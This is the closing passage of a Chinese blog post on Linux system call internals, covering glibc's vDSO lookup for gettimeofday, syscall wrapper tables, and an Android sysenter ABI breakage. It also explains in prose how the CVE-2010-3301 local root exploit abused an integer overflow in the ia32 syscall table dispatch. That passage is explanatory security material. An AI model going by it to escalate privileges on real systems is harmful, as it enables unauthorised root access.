<p>举个例子，<code>glibc</code>中的<code>gettimeofday</code>函数，定义在<a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/gettimeofday.c#L26-L37" target="_blank" rel="external"><code>sysdeps/unix/sysv/linux/x86_64/gettimeofday.c</code></a>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">gettimeofday_ifunc</span> <span class="params">(<span class="keyword">void</span>)</span> __<span class="title">asm__</span> <span class="params">(<span class="string">"__gettimeofday"</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *</span></div><div class="line"><span class="title">gettimeofday_ifunc</span> <span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  PREPARE_VERSION (linux26, <span class="string">"LINUX_2.6"</span>, <span class="number">61765110</span>);</div><div class="line"></div><div class="line">  <span class="comment">/* If the vDSO is not available we fall back on the old vsyscall.  */</span></div><div class="line">  <span class="keyword">return</span> (_dl_vdso_vsym (<span class="string">"gettimeofday"</span>, &amp;linux26)</div><div class="line">          ?: (<span class="keyword">void</span> *) VSYSCALL_ADDR_vgettimeofday);</div><div class="line">&#125;</div><div class="line">__asm (<span class="string">".type __gettimeofday, %gnu_indirect_function"</span>);</div></pre></td></tr></table></figure>
<p>这段glibc中的代码会在vDSO中搜索<code>gettimeofday</code>函数并且返回其地址。这些工作都通过 <a href="http://willnewton.name/uncategorized/using-gnu-indirect-functions/" target="_blank" rel="external">间接函数</a>封装好了。</p>
<p>这就是程序如何通过glibc调用<code>gettimeofday</code>并访问vDSO却完全不用切换到内核、引发特权级转变以及触发软件中断的全过程。</p>
<p>其中也总结了Linux 32/64位 Intel/AMD系统的每种系统调用方法的优势。</p>
<h2 id="glibc-系统调用封装器"><a href="#glibc-系统调用封装器" class="headerlink" title="glibc 系统调用封装器"></a>glibc 系统调用封装器</h2><p>在讨论系统调用的时候，简单的提提glibc是如何处理系统调用是很有意义的。</p>
<p>对于许多系统调用来说，glibc只需要一个简单的封装函数将参数传入合适的寄存器中，然后执行<code>syscall</code>或者<code>int $0x80</code>指令，或者调用<code>_ _kernel_vsyscall</code>。</p>
<p>这些都是利用一系列在文本文件中定义的表完成的，这些表会经过脚本处理并输出C代码。</p>
<p>例如，<a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/syscalls.list" target="_blank" rel="external">`sysdeps/unix/syscalls.list</a> `文件描述了一些常用的系统调用:</p>
<pre><code>access - access i:si __access access acct - acct i:S acct chdir - chdir i:s __chdir chdir chmod - chmod i:si __chmod chmod
</code></pre><p>要了解每一栏目的含义，可以查看处理此文件的脚本注释： <a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/make-syscalls.sh" target="_blank" rel="external"><code>sysdeps/unix/make-syscalls.sh</code></a>.</p>
<p>对于更复杂的系统调用，比如<code>exit</code>，其会触发那些有真正C代码或汇编代码实现的处理函数，并不会出现在类似这样的文本文件中。</p>
<p>以后的博文中会具体介绍glibc的实现以及linux内核中一些重要的系统调用。</p>
<h2 id="重要的syscall相关bugs"><a href="#重要的syscall相关bugs" class="headerlink" title="重要的syscall相关bugs"></a>重要的syscall相关bugs</h2><p>很荣幸能利用这次机会提两个与linux系统调用相关的神奇bugs.</p>
<p>一起来瞧一瞧吧！</p>
<h3 id="CVE-2010-3301"><a href="#CVE-2010-3301" class="headerlink" title="CVE-2010-3301"></a>CVE-2010-3301</h3><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3301" target="_blank" rel="external">这个安全利用</a>能让本地用户获取root权限。</p>
<p>引起这个漏洞的原因就在于汇编代码中的一个小bug，其允许用户程序触发x86_64系统中的传统系统调用。</p>
<p>此利用代码相当聪明:在一个特定的地址下，利用<code>mmap</code>生成一块内存区域，并利用一个整数让代码产生溢出：</p>
<p>（还记得上面章节中提到的传统中断方式中的这段代码吗？）</p>
<pre><code>call *ia32_sys_call_table(,%rax,8)
</code></pre><p>此代码可以将执行环境切换到一块任意的地址中，在那执行内核代码，从而可以将运行的进程权限提升到root.</p>
<h2 id="Android-sysenter-ABI-破坏"><a href="#Android-sysenter-ABI-破坏" class="headerlink" title="Android sysenter ABI 破坏"></a>Android <code>sysenter</code> ABI 破坏</h2><p>还记得前面说过不要在应用程序代码中硬编码<code>sysenter</code> ABI吗？</p>
<p>不幸的是，用android-x86的一些人就容易犯这些错误。只要内核的ABI一改变，andorid-x86就瞬间无法工作。</p>
<p>工作于内核的人最终用一些陈旧的<code>sysenter</code>硬编码序列来恢复<code>sysenter</code> ABI,以避免对Android设备的破坏。</p>
<p><a href="http://git.kernel.org/cgit/linux/kernel/git/tip/tip.git/commit/?id=30bfa7b3488bfb1bb75c9f50a5fcac1832970c60" target="_blank" rel="external">这里</a>是提交给Linux 内核的patch. 你也可以在提交信息中找到向android源码提交的攻击代码的链接</p>
<p>记住：千万不要自己编写汇编代码使用<code>sysenter</code>. 如果你因为某种原因要自己实现，可以使用前面例子中的一些代码，起码要仔细检查一下 <code>__kernel_vsyscall</code>函数。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>Linux内核中的系统调用机制是及其复杂的。触发系统调用有许多中方案，各都有其优缺点。</p>
<p>自己编写汇编代码来触发系统调用可不是个好主意，因为在你代码下层的ABI可能会崩溃。系统中的内核以及libc的实现会（可能会）选择最快的方式来触发系统调用。</p>
<p>如果你不能使用glibc提供的封装器(或者那个封装器不存在),你起码应该用<code>syscall</code>封装器函数，或者仔细检查vDSO提供的<code>_ _kernel_vsyscall</code>.</p>
<p>继续关注将来研究单个系统调用及其实现的相关文章。</p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p>如果你喜欢这篇博客，你可能对以下底层技术的相关博客也感兴趣。</p>
<p><a href="http://blog.packagecloud.io/eng/2016/02/29/how-does-strace-work/" target="_blank" rel="external">How does strace work?</a></p>
<p><a href="http://blog.packagecloud.io/eng/2016/03/14/how-does-ltrace-work/" target="_blank" rel="external">How does ltrace work?</a></p>
<p><a href="http://blog.packagecloud.io/eng/2016/03/21/apt-hash-sum-mismatch/" target="_blank" rel="external">APT Hash sum mismatch</a></p>
<p><a href="http://blog.packagecloud.io/eng/2014/10/28/howto-gpg-sign-verify-deb-packages-apt-repositories/" target="_blank" rel="external">HOWTO: GPG sign and verify deb packages and APT repositories</a></p>
<p><a href="http://blog.packagecloud.io/eng/2014/11/24/howto-gpg-sign-verify-rpm-packages-yum-repositories/" target="_blank" rel="external">HOWTO: GPG sign and verify RPM packages and yum repositories</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/systemcallinternal/" target="_blank" rel="external">Linux系统调用权威指南</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/系统内核/">系统内核</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">下一页</a>
  </nav>

</section>
          <aside id="sidebar">
  
    <div class="widget-wrap" style="margin: 20px 0;">
	<div id="search-form-wrap">

    <form class="search-form">
        <label style="width: 75%;">
            <span class="screen-reader-text">Search for:</span>
            <input type="search" class="search-field" style="height: 42px;" placeholder=" 搜索…" value="" name="s" title="Search for:">
        </label>
        <input type="submit" class="search-form-submit" value="搜索">
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">集思广益</h3>
      <p>我们推崇的是黑客与分享精神，如果您觉得本站对您有帮助，不妨自己也参与进来共同建设，期待您能推荐好文章或投稿至本站，
让更多人受益。本站长期招募志愿者与勤工俭学者参与本站的维护和建设，您可通过邮件csyssec@hotmail.com联系我们</p>
       <div class="widget widget_athemes_social_icons">

    	<ul class="clearfix widget-social-icons">   
    	
   			<li><a href="null" title="Words"><i class="fa fa-words" aria-hidden="true"></i></a></li> 

   		
   		</ul>


   		<!--
   		<ul class="clearfix widget-social-icons">   		
   		<li class="widget-si-twitter"><a href="http://twitter.com" title="Twitter"><i class="ico-twitter"></i></a> </li> 
		<li class="widget-si-facebook"><a href="http://facebook.com" title="Facebook"><i class="ico-facebook"></i></a></li>
			<li class="widget-si-gplus"><a href="http://plus.google.com" title="Google+"><i class="ico-gplus"></i></a></li>
			<li class="widget-si-pinterest"><a href="http://pinterest.com" title="Pinterest"><i class="ico-pinterest"></i></a></li>
			<li class="widget-si-flickr"><a href="http://flickr.com" title="Flickr"><i class="ico-flickr"></i></a></li>
			<li class="widget-si-instagram"><a href="http://instagram.com" title="Instagram"><i class="ico-instagram"></i></a></li>


        	</ul> -->

    </div>
  </div>


  
    
  <div class="widget_athemes_tabs">
    <ul id="widget-tab" class="clearfix widget-tab-nav">
      <li class="active"><a>最新推荐</a></li>
    </ul>
    <div class="widget">
      <ul>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170105/mallocsystemcall/">Malloc使用的系统调用</a></h6>
          <!--  <span>一月 5, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/useafterfree/">Use-after-free</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/maleficarum/">Malloc Maleficarum堆溢出</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/heap-offbyone/">堆内off-by-one漏洞利用</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/glibcmalloc/">深入理解glibc malloc</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/heapoverflow-unlink/">Unlink堆溢出</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/pinintro/">二进制代码注入PIN</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-io/">KVM源码分析之IO虚拟化之PIO</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-memory/">KVM源码分析之内存虚拟化</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-cpu/">KVM源码分析之CPU虚拟化</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-create/">KVM源码分析之虚拟机的创建与运行</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-intro/">KVM源码分析之基本工作原理</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-gotgor/">绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-bruteforce/">绕过ASLR-第二篇章(暴力破解)</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/rootkittutorial/">Rootkit综合教程</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类导航</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签导航</h3>
    <div class="widget tagcloud">
      <a href="/tags/ASLR/" style="font-size: 12.5px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 18.75px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 11.25px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.75px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.25px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 13.75px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.75px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.75px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11.25px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.75px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.25px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.25px;">Stack</a> <a href="/tags/System/" style="font-size: 18.75px;">System</a> <a href="/tags/Systemcall/" style="font-size: 12.5px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 17.5px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      版权所有&copy; 2017 Index of Computer System and Security 保留所有权利.
      </div>
      <div class="site-credit">
       <!--  自豪地使用 <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a> --> 
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/syssec" class="mobile-nav-link">Syssec</a>
  
    <a href="/architecture" class="mobile-nav-link">Architecture</a>
  
    <a href="/virtualization" class="mobile-nav-link">Virtualization</a>
  
    <a href="/malware" class="mobile-nav-link">Malware</a>
  
    <a href="/conferences" class="mobile-nav-link">Conferences</a>
  
    <a href="/academy" class="mobile-nav-link">Academy</a>
  
    <a href="/celebrity" class="mobile-nav-link">Celebrity</a>
  
    <a href="/contribution" class="mobile-nav-link">Contribution</a>
  
    <a href="/donation" class="mobile-nav-link">Donation</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>





  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
  

  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261078922&web_id=1261078922" language="JavaScript"></script>
  </div>


</body>
</html>
